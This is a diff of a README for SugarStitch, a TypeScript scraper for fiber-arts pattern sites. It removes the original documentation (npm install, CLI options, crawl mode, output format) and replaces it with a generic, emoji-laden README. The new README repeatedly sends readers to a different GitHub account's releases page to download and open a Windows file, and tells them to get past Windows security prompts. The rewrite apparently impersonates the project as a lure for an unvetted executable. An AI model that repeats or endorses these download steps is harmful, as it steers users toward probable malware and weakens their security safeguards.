@@ -1,462 +1,198 @@
-<p align="center">
-  <img src="assets/logo.png" alt="SugarStitch logo" width="300" height="300" />
-</p>
+# 🧵 sugarstitch - Save fiber arts patterns with ease
 
-# SugarStitch
+[![Download sugarstitch](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mado2929/sugarstitch/releases)
 
-SugarStitch is a TypeScript scraper for fiber arts pattern websites with both a CLI and a local browser UI. It can scrape individual pattern pages, batch lists of URLs, or discover pattern pages from an index page and then scrape those discovered links for titles, text, images, and PDFs.
+## 🪡 What sugarstitch does
 
-## Screenshots
+sugarstitch is a local-first app for saving fiber arts pattern content from the web. It helps you crawl pattern sites, preview pages, and store text, images, and PDFs on your own computer.
 
-### Local UI
+Use it for:
 
-![SugarStitch homepage UI](website/public/screenshot_homepage.png)
+- crochet patterns
+- knitting patterns
+- sewing patterns
+- other fiber arts project pages
 
-![SugarStitch scraping progress state](website/public/screenshot_scraping.png)
+It keeps your saved files on your Windows PC so you can open them even when you are offline.
 
-![SugarStitch completed run summary](website/public/screenshot_completed.png)
+## 📥 Download for Windows
 
-### CLI
+1. Open the [sugarstitch release page](https://github.com/Mado2929/sugarstitch/releases)
+2. Look for the latest release
+3. Download the Windows file listed there
+4. Save the file to your Desktop or Downloads folder
+5. Open the file to start sugarstitch
 
-![SugarStitch CLI](website/public/screenshot_cli.png)
+If Windows shows a security prompt, choose the option that lets you run the file.
 
-## What It Does
+## 🖥️ Before you start
 
-- Scrapes a single pattern URL or a list of URLs from a text file
-- Includes a simple local browser UI for people who prefer forms over command-line flags
-- Supports discovery crawl mode so one listing page can expand into many pattern pages
-- Supports crawl language filtering so discovered pages can stay in one language
-- Supports crawl pagination so listing pages like `/page/2/` and `/page/3/` can be added automatically
-- Includes built-in selector presets for `generic`, `wordpress`, and `woocommerce`
-- Supports reusable saved site profiles from a JSON config file
-- Lets you override title, description, materials, instructions, and image selectors per run
-- Includes a preview mode to test selectors before downloading files or writing JSON
-- Lets you choose an output directory for the JSON file plus downloaded assets
-- Shows an in-page loading state while preview or scrape requests are running
-- Downloads linked PDFs and page images when found
-- Skips already-known `sourceUrl` entries before re-scraping them
+sugarstitch is made for Windows users who want a simple way to collect pattern pages in one place.
 
-## Best Supported Site Types
+You will need:
 
-SugarStitch works best on sites where the pattern content is already present in the HTML response and does not require a JavaScript app to render first.
+- Windows 10 or Windows 11
+- A stable internet connection for downloading patterns
+- Enough free space for saved images and PDFs
+- A web browser for the browser UI
 
-Typical use cases include:
+For best results, keep your browser up to date.
 
-- sewing pattern blogs
-- crochet pattern pages
-- knitting pattern archives
-- quilting, embroidery, and other fiber arts tutorial or pattern sites
+## 🚀 Install and open
 
-Usually a good fit:
+1. Go to the [release page](https://github.com/Mado2929/sugarstitch/releases)
+2. Download the Windows version
+3. Open the downloaded file
+4. If a folder or app window appears, keep it open
+5. Follow the on-screen steps if the app asks for a location or setup choice
 
-- WordPress pattern blogs and article pages
-- Blogger and Blogspot pattern pages
-- WooCommerce product-style pattern pages
-- older handcrafted sites with normal HTML articles
-- free-pattern archive pages that link to regular child pages
+If you move the file after download, update the shortcut or open it from the new location.
 
-More mixed or site-specific:
+## 🌐 Open the browser UI
 
-- Wix
-- Squarespace
-- Webflow
-- custom JavaScript-heavy sites
+sugarstitch includes a simple browser interface for easy use.
 
-Usually not a good fit with the current scraper approach:
+To open it:
 
-- React single-page apps
-- hash-routed sites like `#/free-patterns`
-- pages where the content only appears after client-side JavaScript runs
+1. Start sugarstitch
+2. Wait for the local page to load
+3. Open the browser UI if it does not open on its own
+4. Use the page to crawl, preview, and save content
 
-Why:
+The browser UI is made for simple tasks. You can use it without learning command-line tools.
 
-SugarStitch currently fetches page HTML and parses it directly. It does not run a full browser-rendered scraping flow yet, so JavaScript-only pages may return just the site shell instead of the real pattern content.
+## 📚 How to save a pattern
 
-If a site only partly works, try:
+1. Copy the web page address for the pattern you want
+2. Paste it into sugarstitch
+3. Start the crawl
+4. Review the preview
+5. Save the text, images, or PDF files you want
 
-- switching selector presets
-- using `Test Selectors` first
-- creating a saved site profile
-- adding one or two advanced selector overrides
+For best results:
 
-## Install
+- save one pattern at a time
+- check the preview before saving
+- keep the page open until the crawl finishes
 
-### Global Install
+## 🗂️ What gets saved
 
-```bash
-npm install -g @pinkpixel/sugarstitch
-```
+sugarstitch can collect:
 
-Then run it as:
+- pattern text
+- step-by-step instructions
+- images
+- PDF files
+- page links for later use
 
-```bash
-sugarstitch --url "https://example.com/pattern"
-```
+Saved files stay on your computer, so you can keep a local library of patterns.
 
-### Local Development Install
+## 🧰 Main features
 
-```bash
-git clone https://github.com/pinkpixel-dev/sugarstitch.git
-cd sugarstitch
-npm install
-```
+- local-first storage
+- simple browser UI
+- command-line support
+- pattern page crawling
+- preview before saving
+- text and image capture
+- PDF download support
+- built for fiber arts sites
 
-## Available Scripts
+This makes it useful for people who want to save patterns for later reading or printing.
 
-```bash
-npm run build
-```
+## 🛠️ Using the command line
 
-Compiles TypeScript into `dist/`.
+Most users can stay in the browser UI. If you prefer a text window, sugarstitch also offers a CLI.
 
-```bash
-npm run scrape -- --url "https://example.com/pattern"
-```
+The CLI can help you:
 
-Runs the CLI with `ts-node`.
+- start a crawl
+- save a pattern from a web address
+- manage saved files
+- run tasks from a terminal window
 
-```bash
-npm run ui
-```
+If you are not used to command lines, you can skip this part and use the browser UI.
 
-Starts the local UI at `http://localhost:4177`.
+## 🧵 Tips for better results
 
-## Quick Start
+- Use the full pattern page, not a search page
+- Avoid pages that hide content behind extra clicks
+- Save one site at a time
+- Check the preview for missing images
+- Keep your pattern files in one folder
+- Use clear folder names for crochet, knitting, and sewing projects
 
-### Scrape One Pattern Page
+If a page loads slowly, wait for all images and text to finish before saving.
 
-```bash
-npm run scrape -- --url "https://example.com/pattern" --preset wordpress
-```
+## 🔍 Good use cases
 
-### Scrape Many URLs From a File
+sugarstitch works well for:
 
-Create `urls.txt`:
+- saving free crochet patterns
+- keeping knitting instructions in one place
+- archiving sewing tutorials
+- storing printable PDF patterns
+- building a local pattern library
 
-```txt
-https://example.com/pattern-1
-https://example.com/pattern-2
-https://example.com/pattern-3
-```
+It is a good fit if you want your pattern content in a folder on your computer instead of only in a browser tab.
 
-Then run:
+## 📁 Suggested folder setup
 
-```bash
-npm run scrape -- --file urls.txt
-```
+You can keep your saved files organized like this:
 
-### Save Output Somewhere Else
+- `Patterns/Crochet`
+- `Patterns/Knitting`
+- `Patterns/Sewing`
+- `Patterns/PDF`
+- `Patterns/Images`
 
-```bash
-npm run scrape -- --url "https://example.com/pattern" --output-dir ./exports --output patterns.json
-```
+This makes it easier to find patterns later.
 
-That saves:
+## ⚙️ If the app does not open
 
-- `patterns.json`
-- `images/`
-- `pdfs/`
-- `texts/`
+Try these steps:
 
-inside `./exports`.
+1. Close the app
+2. Open it again from the downloaded file
+3. Make sure Windows did not block it
+4. Check that your internet connection works
+5. Try a different browser if the UI does not load
 
-## Discovery Crawl Mode
+If the file does not start, download it again from the release page.
 
-Discovery crawl mode is for index pages such as “Free Patterns” pages. Instead of entering every pattern URL yourself, you can start from one page and let SugarStitch follow links a couple levels deep before scraping the discovered pages.
+## 🧩 About the project
 
-This is useful for:
+sugarstitch uses web scraping tools to collect pattern content from public pages. It is built with a local-first setup, so your saved files stay on your machine.
 
-- free-pattern listing pages
-- archive pages
-- blog category pages
-- collections where the real pattern content lives on child pages
+The project is useful for users who want a simple way to:
 
-### Example
+- browse pattern pages
+- preview content before saving
+- keep text, images, and PDFs together
+- avoid losing patterns in browser bookmarks
 
-```bash
-npm run scrape -- \
-  --url "https://www.tildasworld.com/free-patterns/" \
-  --preset wordpress \
-  --crawl \
-  --crawl-depth 2 \
-  --crawl-pattern "free_pattern|pattern|quilt|pillow" \
-  --crawl-language english \
-  --crawl-paginate
-```
+## 🔗 Download again
 
-That tells SugarStitch to:
+[Go to the sugarstitch release page](https://github.com/Mado2929/sugarstitch/releases)
 
-1. Start from the given listing page
-2. Follow matching links up to 2 levels deep
-3. Stay on the same domain by default
-4. Scrape the discovered pages themselves
+## ❓ Common questions
 
-So if a child page is a blog-style pattern page with no PDF but useful article content, SugarStitch will still try to scrape that page normally.
+### Is sugarstitch hard to use?
 
-### Crawl Options
+No. The browser UI is made for simple use. You can paste a page link, preview it, and save it.
 
-- `--crawl`: turns discovery mode on
-- `--crawl-depth <number>`: how many link levels deep to follow
-- `--crawl-pattern <pattern>`: only follow links whose URL or link text matches this text or regex
-- `--crawl-language <language>`: prefer discovered URLs for one language such as `english`, `french`, or `portuguese`
-- `--crawl-paginate`: expand paginated listing pages like `/page/2/`, `/page/3/`, and so on
-- `--crawl-max-pages <number>`: cap how many listing pages are added in pagination mode
-- `--crawl-any-domain`: allow discovery to follow links outside the starting domain
-- `--crawl-max-urls <number>`: cap how many discovered pages get scraped
+### Do I need coding skills?
 
-### Why Crawl Language Filtering Helps
+No. You can use the app without programming knowledge.
 
-Some sites expose multiple language sections from the same listing page. For example, an English archive may also link to French or Portuguese archives. With `--crawl-language english`, SugarStitch can keep the discovered crawl focused on English pages instead of mixing languages into one run.
+### Can I use it offline?
 
-### Why Crawl Pagination Helps
+You need internet access to collect a pattern from a website. After saving, you can open your local files offline.
 
-Some listing pages only expose the first batch of pattern cards until you click a `Load More` control. If the site also exposes those later batches as regular paginated URLs, SugarStitch can add those deeper listing pages automatically before discovery continues.
+### What kinds of patterns work best?
 
-## Local Web UI
+Pattern pages with visible text, images, or PDF links work best. Clear layouts give the best results.
 
-Run:
+### Does it save files on the web?
 
-```bash
-npm run ui
-```
-
-Then open:
-
-```text
-http://localhost:4177
-```
-
-![SugarStitch homepage showing the scrape form and saved profiles](website/public/screenshot_homepage.png)
-
-The UI includes:
-
-- single URL mode
-- multi-URL paste mode
-- saved site profile dropdown
-- selector preset dropdown
-- advanced selector override fields
-- discovery crawl controls
-- crawl language and crawl pagination controls
-- output JSON filename field
-- output directory field
-- `Test Selectors` preview button
-- `Start Scraping` button
-- light and dark mode toggle
-- spinner/progress overlay while requests are running
-
-![SugarStitch progress overlay while a scrape is running](website/public/screenshot_scraping.png)
-
-![SugarStitch completed run summary with log output](website/public/screenshot_completed.png)
-
-### Output Directory In the UI
-
-Use the `Output Directory` field to choose where the JSON file and downloaded folders should be saved.
-
-If left blank, SugarStitch saves into the project folder you launched it from.
-
-Note:
-This is currently a path field, not a native folder picker. In a normal browser-based local UI, the page cannot reliably hand a true local filesystem path back to the server the way a desktop app can.
-
-## Selector Presets
-
-Selector presets are defined in [`src/scraper.ts`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/src/scraper.ts).
-
-Built-in presets:
-
-- `generic`: a broad fallback for custom and article-style pages
-- `wordpress`: tuned for common WordPress post wrappers like `.entry-content`
-- `woocommerce`: tuned for WooCommerce product pages and galleries
-
-These are starting points, not guarantees.
-
-## Advanced Selector Overrides
-
-If a preset is close but not quite right, you can override only the fields you need for a single run.
-
-Available override flags:
-
-- `--title-selector`
-- `--description-selector`
-- `--materials-selector`
-- `--instructions-selector`
-- `--image-selector`
-
-Example:
-
-```bash
-npm run scrape -- \
-  --url "https://example.com/pattern" \
-  --preset wordpress \
-  --materials-selector ".entry-content ul li"
-```
-
-Overrides take priority over the selected preset for that field only.
-
-## Saved Site Profiles
-
-SugarStitch can load reusable profiles from [`sugarstitch.profiles.json`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/sugarstitch.profiles.json).
-
-Each profile can define:
-
-- `id`
-- `label`
-- `description`
-- `preset`
-- `selectorOverrides`
-
-Example:
-
-```json
-{
-  "profiles": [
-    {
-      "id": "tildas-world",
-      "label": "Tilda's World",
-      "preset": "wordpress",
-      "selectorOverrides": {
-        "materialsSelector": ".entry-content ul li",
-        "instructionsSelector": ".entry-content ol li"
-      }
-    }
-  ]
-}
-```
-
-Use one with:
-
-```bash
-npm run scrape -- --url "https://example.com/pattern" --profile tildas-world
-```
-
-Or point to another file:
-
-```bash
-npm run scrape -- --url "https://example.com/pattern" --profile tildas-world --profiles-file ./my-profiles.json
-```
-
-## Preview Mode
-
-Preview mode lets you test extraction before writing JSON or downloading files.
-
-It:
-
-- fetches the page
-- applies the selected preset, saved profile, and any advanced overrides
-- shows the matched title, description, materials, instructions, images, and PDFs
-- does not write files
-
-CLI example:
-
-```bash
-npm run scrape -- --url "https://example.com/pattern" --profile tildas-world --preview
-```
-
-UI flow:
-
-1. Choose `Single URL`
-2. Enter a pattern page URL
-3. Pick a preset or saved profile
-4. Add overrides if needed
-5. Click `Test Selectors`
-
-## CLI Options
-
-```text
--u, --url <url>                     A single URL of the pattern page to scrape
--f, --file <file>                   A text file containing a list of URLs
--o, --output <path>                 Output JSON file name
---output-dir <path>                 Directory where JSON, images, and PDFs should be saved
--p, --preset <preset>               Selector preset
---crawl                             Discover links from the starting URL(s) before scraping them
---crawl-depth <number>              How many link levels deep to follow in crawl mode
---crawl-pattern <pattern>           Only follow discovered links whose URL or link text matches this text or regex
---crawl-language <language>         Prefer discovered URLs for one language such as english, french, or portuguese
---crawl-paginate                    Expand listing pages like /page/2/, /page/3/, and scrape them too
---crawl-max-pages <number>          Maximum listing pages to add in pagination mode
---crawl-any-domain                  Allow crawl mode to follow links to other domains
---crawl-max-urls <number>           Maximum number of discovered page URLs to scrape
---profile <id>                      Use a saved site profile
---profiles-file <path>              Path to the profiles config file
---preview                           Preview extraction without saving files
---title-selector <selector>
---description-selector <selector>
---materials-selector <selector>
---instructions-selector <selector>
---image-selector <selector>
-```
-
-## Output Structure
-
-SugarStitch writes one object per successfully scraped page:
-
-```json
-{
-  "title": "Pattern Title",
-  "description": "Short description from the page",
-  "materials": ["Cotton fabric", "Stuffing", "Thread"],
-  "instructions": ["Cut the pieces", "Sew the body", "Stuff and close"],
-  "sourceUrl": "https://example.com/pattern",
-  "localImages": ["images/pattern_title/image_1.jpg"],
-  "localPdfs": ["pdfs/pattern_title/pattern.pdf"],
-  "localTextFile": "texts/pattern_title/pattern.txt"
-}
-```
-
-Each scraped page also gets a plain-text artifact at `texts/<pattern_title>/pattern.txt`.
-
-That text file includes:
-
-- title
-- source URL
-- selected preset and optional profile
-- extracted description
-- extracted materials list
-- extracted instructions list
-- a fuller page text block gathered from the article content
-
-## Notes
-
-- The CLI prints a small SugarStitch ASCII banner when run in a normal terminal.
-- The local UI now includes a light/dark mode toggle, with light mode as the default.
-
-![SugarStitch CLI banner and progress output](website/public/screenshot_cli.png)
-
-## Troubleshooting
-
-### It scraped PDFs and titles, but not much else
-
-That still counts as a successful scrape. It usually means the page-level selectors for description, materials, instructions, or images do not match the site structure yet.
-
-Try one of these:
-
-- run `Test Selectors` in the UI first
-- switch presets
-- use a saved profile for that site
-- add one or two advanced overrides
-
-### Discovery crawl found too much or too little
-
-Adjust:
-
-- `crawl depth`
-- `crawl pattern`
-- `crawl language`
-- crawl pagination settings
-- same-domain restriction
-- max discovered URLs
-
-### The output file already exists but the scraper refuses to run
-
-If the JSON file contains invalid JSON, SugarStitch will stop instead of silently overwriting it. Fix or remove the broken file first.
-
-## Development Notes
-
-- CLI entrypoint: [`src/index.ts`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/src/index.ts)
-- UI entrypoint: [`src/server.ts`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/src/server.ts)
-- Shared scraper logic: [`src/scraper.ts`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/src/scraper.ts)
-- Starter profiles config: [`sugarstitch.profiles.json`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/sugarstitch.profiles.json)
-- Technical overview: [`OVERVIEW.md`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/OVERVIEW.md)
-
-## License
-
-This project is licensed under the MIT License. See [`LICENSE`](/home/sizzlebop/PINKPIXEL/PROJECTS/CURRENT/sugarstitch/LICENSE).
+No. It saves files on your own Windows computer.
